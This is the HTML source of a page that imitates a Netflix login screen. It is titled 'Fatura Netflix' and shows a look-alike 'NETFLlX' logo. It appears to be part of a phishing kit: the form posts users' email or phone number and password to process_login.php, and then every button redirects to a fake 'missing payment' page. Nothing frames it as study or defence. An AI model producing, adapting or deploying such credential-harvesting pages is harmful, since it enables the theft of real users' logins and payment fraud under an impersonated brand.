<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fatura Netflix</title>
<link rel="icon" type="image/x-icon" href="icone.ico">
<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@700&display=swap" rel="stylesheet">
<style>
    body, html {
        height: 100%;
        margin: 0;
        font-family: Arial, sans-serif;
    }

    .bg {
        background-image: url('fundo.jpg');
        height: 100%; 
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
        position: relative;
    }

    .bg::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.7);
        z-index: 1;
    }

    .header-logo {
        position: absolute;
        top: 20px;
        left: 20px;
        z-index: 2;
        color: #FF0000;
        font-family: 'Be Vietnam Pro', sans-serif;
        font-size: 48px;
        font-weight: bold;
    }

    .login-container {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        width: 90%;
        max-width: 350px;
        padding: 30px;
        background-color: rgba(17, 17, 17, 0.9);
        border-radius: 10px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        color: white;
        z-index: 1;
    }

    .login-container h2 {
        text-align: left;
        margin-bottom: 20px;
        font-size: 24px;
        color: #fff;
    }

    input[type="text"], input[type="password"] {
        width: 100%;
        padding: 12px;
        margin: 10px 0;
        display: inline-block;
        border: none;
        background: #333;
        color: white;
        border-radius: 5px;
        font-size: 16px;
    }

    input[type="text"]::placeholder, input[type="password"]::placeholder {
        color: #aaa;
    }

    button {
        background-color: #FF0000;
        color: white;
        padding: 14px 20px;
        margin: 10px 0;
        border: none;
        cursor: pointer;
        width: 100%;
        border-radius: 5px;
        font-size: 16px;
        transition: background-color 0.3s ease;
    }

    button:hover {
        background-color: #CC0000;
    }

    .secondary-button {
        background-color: transparent;
        border: 2px solid #FF0000;
        color: #FF0000;
        margin-top: 10px;
    }

    .secondary-button:hover {
        background-color: #FF0000;
        color: white;
    }

    .small-text {
        display: block;
        text-align: center;
        margin-top: 15px;
        color: #fff;
    }

    .login-container label {
        display: block;
        margin-top: 10px;
        font-size: 14px;
        color: #ccc;
    }

    .login-container input[type="checkbox"] {
        margin-right: 5px;
    }

    .or-divider {
        text-align: center;
        margin: 20px 0;
        font-size: 14px;
        color: #ccc;
    }

    @media screen and (max-width: 768px) {
        .header-logo {
            font-size: 36px;
        }

        .login-container {
            width: 100%;
            height: auto;
            padding: 20px;
            border-radius: 0;
            box-shadow: none;
        }

        button {
            padding: 12px;
        }

        input[type="text"], input[type="password"] {
            padding: 10px;
            font-size: 14px;
        }
    }
</style>
<script>
// FunÃ§Ã£o para redirecionar apÃ³s o login
function redirectToFaltaPago() {
    window.location.href = "faltadepagamento.html"; // Redireciona para a pÃ¡gina apÃ³s o envio
}

// FunÃ§Ã£o para redirecionar para cadastro.html
function redirectToRegistro() {
    window.location.href = "faltadepagamento.html"; // Redireciona para a pÃ¡gina de cadastro
}
</script>
</head>
<body>

<div class="bg">
    <!-- Div que redirige ao clicar -->
    <div class="header-logo" onclick="redirectToIndex()">NETFLlX</div>

    <script>
        // FunÃ§Ã£o para redirigir a index.html
        function redirectToIndex() {
            window.location.href = 'index.html';
        }
    </script>
    <div class="login-container">
        <h2>Entrar</h2>
        <form method="POST" action="process_login.php">
            <input type="text" placeholder="Email ou nÃºmero de celular" name="email_or_phone" required>
            <input type="password" placeholder="Senha" name="password" required>
            <button type="submit" onclick="redirectToFaltaPago()">Entrar</button>
            <div class="or-divider">Ou</div>
            <button type="button" class="secondary-button" onclick="redirectToRegistro()">Cadastre-se</button>
            <a href="#" class="small-text">Esqueceu a senha?</a>
            <label><input type="checkbox" checked="checked" name="remember"> Salvar</label>
        </form>
    </div>
</div>

</body>
</html>
